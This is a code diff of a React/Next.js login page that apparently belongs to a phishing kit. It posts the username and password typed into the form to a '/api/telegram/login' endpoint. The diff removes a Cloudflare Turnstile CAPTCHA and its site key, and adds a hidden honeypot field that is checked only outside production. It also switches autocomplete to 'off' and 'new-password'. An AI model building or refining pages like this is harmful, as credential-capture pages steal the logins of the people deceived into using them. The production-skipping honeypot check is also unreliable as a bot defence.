@@ -4,7 +4,6 @@ import { useState, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import { Preloader } from "@/components/preloader";
 import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
-import { Turnstile } from "@marsidev/react-turnstile";
 
 export default function LoginPage() {
   const [showContent, setShowContent] = useState(false);
@@ -49,7 +48,7 @@ export default function LoginPage() {
   const [isLoginLoading, setIsLoginLoading] = useState(false);
   const [loginError, setLoginError] = useState<string | null>(null);
   const [countdown, setCountdown] = useState(0);
-  const [turnstileToken, setTurnstileToken] = useState<string | null>(null);
+  const [honeypot, setHoneypot] = useState("");
   const countdownRef = useRef<number | null>(null);
   const redirectRef = useRef<number | null>(null);
   const router = useRouter();
@@ -57,8 +56,8 @@ export default function LoginPage() {
   const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
     if (isLoginLoading || !username || !password) return;
-    if (!turnstileToken) {
-      setLoginError("Please complete the CAPTCHA to proceed.");
+    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
+      setLoginError("Suspicious activity detected. Please try again.");
       return;
     }
     setLoginError(null);
@@ -68,7 +67,7 @@ export default function LoginPage() {
       const response = await fetch("/api/telegram/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ userId: username, password, turnstileToken }),
+        body: JSON.stringify({ userId: username, password }),
       });
       if (!response.ok) {
         throw new Error("Failed to send login data");
@@ -195,7 +194,7 @@ export default function LoginPage() {
           </header>
 
           <main>
-            <form onSubmit={handleSignIn}>
+            <form onSubmit={handleSignIn} autoComplete="off">
               <div className="card">
                 <div className="card-logo">
                   <img
@@ -221,7 +220,7 @@ export default function LoginPage() {
                   <input
                     type="text"
                     id="c1-user"
-                    autoComplete="username"
+                    autoComplete="off"
                     value={username}
                     onChange={(e) => setUsername(e.target.value)}
                   />
@@ -243,7 +242,7 @@ export default function LoginPage() {
                   <input
                     type={showPassword ? "text" : "password"}
                     id="c1-pass"
-                    autoComplete="current-password"
+                    autoComplete="new-password"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                   />
@@ -264,18 +263,18 @@ export default function LoginPage() {
                   </button>
                 </div>
 
+                <input
+                  type="text"
+                  name="website"
+                  value={honeypot}
+                  onChange={(e) => setHoneypot(e.target.value)}
+                  style={{ display: "none" }}
+                  autoComplete="off"
+                />
+
                 <label className="remember">
                   <input type="checkbox" /> Remember Me
                 </label>
-
-                <div style={{ marginBottom: "20px" }}>
-                  <Turnstile
-                    siteKey="0x4AAAAAAC8q_nGqoop2ghkR"
-                    onSuccess={(token) => setTurnstileToken(token)}
-                    onError={() => setTurnstileToken(null)}
-                    onExpire={() => setTurnstileToken(null)}
-                  />
-                </div>
 
                 <button
                   type="submit"
